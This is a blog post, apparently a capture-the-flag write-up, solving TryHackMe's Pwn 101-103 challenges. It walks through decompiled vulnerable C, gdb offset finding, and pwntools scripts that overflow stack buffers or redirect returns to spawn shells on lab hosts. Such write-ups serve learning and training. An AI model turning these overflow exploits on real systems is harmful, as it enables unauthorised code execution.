---
author: pl4int3xt
layout: post
title: Pwn 101 - Tryhackme
date: '2024-01-18'
description: "Beginner level binary exploitation challenges from Tryhackme"
categories: [Pwn 101]
tags: [binary exploitation, Tryhackme ]
---

## PWN 101
Let's download the task file and decompile it. After decompiling the task file with ghidra we get an idea that their is a possible buffer overflow in the code since `gets()` is used which is a dangerous function

```c
void main(void)

{
  char local_48 [60];
  int local_c;
  
  local_c = 0x539;
  setup();
  banner();
  puts(
      "Hello!, I am going to shopping.\nMy mom told me to buy some ingredients.\nUmmm.. But I have l ow memory capacity, So I forgot most of them.\nAnyway, she is preparing Briyani for lunch, Can  you help me to buy those items :D\n"
      );
  puts("Type the required ingredients to make briyani: ");
  gets(local_48);
  if (local_c == 0x539) {
    puts("Nah bruh, you lied me :(\nShe did Tomato rice instead of briyani :/");
                    /* WARNING: Subroutine does not return */
    exit(0x539);
  }
  puts("Thanks, Here\'s a small gift for you <3");
  system("/bin/sh");
  return;
}
```

Let's run the code and see 

```shell
pl4int3xt@archlinux ~/D/p/pwn101> ./pwn101.pwn101
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 101          

Hello!, I am going to shopping.
My mom told me to buy some ingredients.
Ummm.. But I have low memory capacity, So I forgot most of them.
Anyway, she is preparing Briyani for lunch, Can you help me to buy those items :D

Type the required ingredients to make briyani: 
salt
Nah bruh, you lied me :(
She did Tomato rice instead of briyani :/
```

Let's generate 100 A's and see if it overflows the buffer

```shell
pl4int3xt@archlinux ~/D/p/pwn101 [124]> python -c 'print ("A"*100)'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

The A's worked from the local binary

```shell
pl4int3xt@archlinux ~/D/p/pwn101> ./pwn101.pwn101
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 101          

Hello!, I am going to shopping.
My mom told me to buy some ingredients.
Ummm.. But I have low memory capacity, So I forgot most of them.
Anyway, she is preparing Briyani for lunch, Can you help me to buy those items :D

Type the required ingredients to make briyani: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Thanks, Here's a small gift for you <3
sh-5.2$ ls
payload  pwn101.pwn101	pwn101.py
sh-5.2$
```

Let's create a script to automate that

```python
from pwn import *

io = remote(sys.argv[1], sys.argv[2])
io.sendlineafter(b':', b"A"*100)
io.interactive()
```

We get a shell in the system since the code calls `/bin/sh` after the overflow

```shell
pl4int3xt@archlinux ~/D/p/pwn101 [1]> python3 pwn101.py 10.10.95.255 9001
[+] Opening connection to 10.10.95.255 on port 9001: Done
[*] Switching to interactive mode
Type the required ingredients to make briyani: 
Thanks, Here's a small gift for you <3
$ ls
flag.txt
pwn101
pwn101.c
$ cat flag.txt
THM{REDACTED..}
$ 
```

## PWN 102
Let's download and decompile the binary with ghidra

```c
void main(void){

  undefined local_78 [104];
  int local_10;
  int local_c;
  
  setup();
  banner();
  local_c = 0xbadf00d;
  local_10 = -0x11e2153;
  printf("I need %x to %x\nAm I right? ",0xbadf00d,0xfee1dead);
  __isoc99_scanf(&DAT_00100b66,local_78);
  if ((local_c == 0xc0ff33) && (local_10 == 0xc0d3)) {
    printf("Yes, I need %x to %x\n",0xc0ff33,0xc0d3);
    system("/bin/sh");
    return;
  }
  puts("I\'m feeling dead, coz you said I need bad food :(");
                    /* WARNING: Subroutine does not return */
  exit(0x539);

}
```

The binary checks if `local_c = 0xc0ff33` and `local_10 = 0xc0d3`. but initial they are set to this

```c
local_c = 0xbadf00d;
local_10 = -0x11e2153;
```

So basically we want to overwrite the variables in the stack and assign them as follows
```c
local_c = 0xc0ff33;
local_10 = 0xc0d3;
```

Let's check the security protections with checksec

```shell
pl4int3xt@archlinux ~/D/p/pwn102> checksec --file=pwn102.pwn102 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   73 Symbols	 No	pwn102.pwn102
```

We disassemble main function and notice the first compare at `0x0000000000000959 <+91>:	cmp    DWORD PTR [rbp-0x4],0xc0ff33` 

```shell
pwndbg> disassemble main
Dump of assembler code for function main:
   0x00000000000008fe <+0>:	push   rbp
   0x00000000000008ff <+1>:	mov    rbp,rsp
   0x0000000000000902 <+4>:	sub    rsp,0x70
   0x0000000000000906 <+8>:	mov    eax,0x0
   0x000000000000090b <+13>:	call   0x88a <setup>
   0x0000000000000910 <+18>:	mov    eax,0x0
   0x0000000000000915 <+23>:	call   0x8eb <banner>
   0x000000000000091a <+28>:	mov    DWORD PTR [rbp-0x4],0xbadf00d
   0x0000000000000921 <+35>:	mov    DWORD PTR [rbp-0x8],0xfee1dead
   0x0000000000000928 <+42>:	mov    edx,DWORD PTR [rbp-0x8]
   0x000000000000092b <+45>:	mov    eax,DWORD PTR [rbp-0x4]
   0x000000000000092e <+48>:	mov    esi,eax
   0x0000000000000930 <+50>:	lea    rdi,[rip+0x212]        # 0xb49
   0x0000000000000937 <+57>:	mov    eax,0x0
   0x000000000000093c <+62>:	call   0x730 <printf@plt>
   0x0000000000000941 <+67>:	lea    rax,[rbp-0x70]
   0x0000000000000945 <+71>:	mov    rsi,rax
   0x0000000000000948 <+74>:	lea    rdi,[rip+0x217]        # 0xb66
   0x000000000000094f <+81>:	mov    eax,0x0
   0x0000000000000954 <+86>:	call   0x750 <__isoc99_scanf@plt>
   0x0000000000000959 <+91>:	cmp    DWORD PTR [rbp-0x4],0xc0ff33
   0x0000000000000960 <+98>:	jne    0x992 <main+148>
   0x0000000000000962 <+100>:	cmp    DWORD PTR [rbp-0x8],0xc0d3
   0x0000000000000969 <+107>:	jne    0x992 <main+148>
   0x000000000000096b <+109>:	mov    edx,DWORD PTR [rbp-0x8]
   0x000000000000096e <+112>:	mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000000971 <+115>:	mov    esi,eax
   0x0000000000000973 <+117>:	lea    rdi,[rip+0x1ef]        # 0xb69
   0x000000000000097a <+124>:	mov    eax,0x0
   0x000000000000097f <+129>:	call   0x730 <printf@plt>
   0x0000000000000984 <+134>:	lea    rdi,[rip+0x1f4]        # 0xb7f
   0x000000000000098b <+141>:	call   0x720 <system@plt>
   0x0000000000000990 <+146>:	jmp    0x9a8 <main+170>
   0x0000000000000992 <+148>:	lea    rdi,[rip+0x1ef]        # 0xb88
   0x0000000000000999 <+155>:	call   0x710 <puts@plt>
   0x000000000000099e <+160>:	mov    edi,0x539
   0x00000000000009a3 <+165>:	call   0x760 <exit@plt>
   0x00000000000009a8 <+170>:	leave
   0x00000000000009a9 <+171>:	ret
End of assembler dump.
pwndbg>
```

we run cyclic 200 and put our break point at `0x0000000000000959` which is the first compare to get the offset

```shell
pwndbg> b *0x0000555555400959
Breakpoint 1 at 0x555555400959
pwndbg> cyclic 200
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
pwndbg> run
Starting program: /home/pl4int3xt/Documents/pwn/pwn102/pwn102.pwn102 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 102          

I need badf00d to fee1dead
Am I right? aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa

Breakpoint 1, 0x0000555555400959 in main ()
```

Let's look at the values that overflowed and overwrote the `$rbp - 4` register to get the offset

```shell
pwndbg> x/s $rbp-4
0x7fffffffe65c:	"aaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa"
pwndbg> cyclic -l aaaaoaaa
Finding cyclic pattern of 8 bytes: b'aaaaoaaa' (hex: 0x616161616f616161)
Found at offset 108
```

We need to overwrite `$rbp - 4` with `0xc0ff33` and `$rbp - 8` with `0xc0d3`. We need also to know the offsets of both registers. If the offset of `$rbp-4` is `108` the offset of `$rbp-8` will be `104`

```shell
$rbp-4 = 108
$rbp-8 = 104
```

Let's create a python script to overwrite those variables and get a shell

```python
import sys
from pwn import *
from struct import *

exe = './pwn102.pwn102'
elf = context.binary = ELF(exe, checksec=False)

io = remote("10.10.31.35", 9002)

rbp_8 = pack("<I", 0xc0d3)
rbp_4 = pack("<I", 0xc0ff33)

payload = flat(
    asm('nop') * 104,
    rbp_8,
    rbp_4
)

write('payload', payload)
io.sendlineafter(b'?', payload)
io.interactive()
```

Let's run the code using the remote server and the provided port to get a shell and the flag

```shell
pl4int3xt@archlinux ~/D/p/pwn102> python3 pwn102.py 
[+] Opening connection to 10.10.31.35 on port 9002: Done
[*] Switching to interactive mode
Yes, I need c0ff33 to c0d3
$ ls
flag.txt
pwn102
pwn102.c
$ cat flag.txt
THM{REDACTED..}
$
```

## PWN 103
Let's download the task file and decompile it with ghidra. `general()` has a buffer overflow.

```c
void general(void){
  int iVar1;
  char local_28 [32];
  
  puts(&DAT_004023aa);
  puts(&DAT_004023c0);
  puts(&DAT_004023e8);
  puts(&DAT_00402418);
  printf("------[pwner]: ");
  __isoc99_scanf(&DAT_0040245c,local_28);
  iVar1 = strcmp(local_28,"yes");
  if (iVar1 == 0) {
    puts(&DAT_00402463);
    main();
  }
  else {
    puts(&DAT_0040247f);
  }
  return;
}
```

`admins_only()` seems interesting since it opens a shell for us. All we need to to is overflow the buffer at `general()` and return to `admins_only()`.

```c
void admins_only(void){
  puts(&DAT_00403267);
  puts(&DAT_0040327c);
  system("/bin/sh");
  return;
}
```

Let's fire up pwndbg and crash the program

```shell
pwndbg> cyclic 100
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
pwndbg> run
Starting program: /home/pl4int3xt/Documents/pwn/pwn103/pwn103.pwn103 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡟⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢹⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠄⢠⣴⣾⣵⣶⣶⣾⣿⣦⡄⠄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⢀⣾⣿⣿⢿⣿⣿⣿⣿⣿⣿⡄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⢸⣿⣿⣧⣀⣼⣿⣄⣠⣿⣿⣿⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠘⠻⢷⡯⠛⠛⠛⠛⢫⣿⠟⠛⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⣧⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢡⣀⠄⠄⢸⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣆⣸⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿

  [THM Discord Server]

➖➖➖➖➖➖➖➖➖➖➖
1) 📢 Announcements
2) 📜 Rules
3) 🗣  General
4) 🏠 rooms discussion
5) 🤖 Bot commands
➖➖➖➖➖➖➖➖➖➖➖
⌨️  Choose the channel: 3

🗣  General:

------[jopraveen]: Hello pwners 👋
------[jopraveen]: Hope you're doing well 😄
------[jopraveen]: You found the vuln, right? 🤔

------[pwner]: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
Try harder!!! 💪

Program received signal SIGSEGV, Segmentation fault.
0x0000000000401377 in general ()
```

We get the offset of the binary is 40

```shell
pwndbg> cyclic -l faaaaaaa
Finding cyclic pattern of 8 bytes: b'faaaaaaa' (hex: 0x6661616161616161)
Found at offset 40
```

Let's create a script to automate the process.

```python
from pwn import *

exe = './pwn103.pwn103'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

io = remote("10.10.135.73" ,9003)

admins_only = elf.sym.admins_only

payload = flat(
    asm('nop') * 40,
    p64(0x0000000000401016),
    admins_only
)

write('payload', payload)
io.sendlineafter(b':', '3')
io.sendlineafter(b':', payload)
io.interactive()
```

Running the script on the remote server we get a shell and the flag

```shell
pl4int3xt@archlinux ~/D/p/pwn103> python3 pwn103.py
[+] Opening connection to 10.10.135.73 on port 9003: Done
[*] Switching to interactive mode
------[jopraveen]: Hello pwners 👋
------[jopraveen]: Hope you're doing well 😄
------[jopraveen]: You found the vuln, right? 🤔
------[pwner]: 
Try harder!!! 💪

👮  Admins only:

Welcome admin 😄
$ ls
flag.txt
pwn103
pwn103.c
$ cat flag.txt
THM{REDACTED..}
$
```

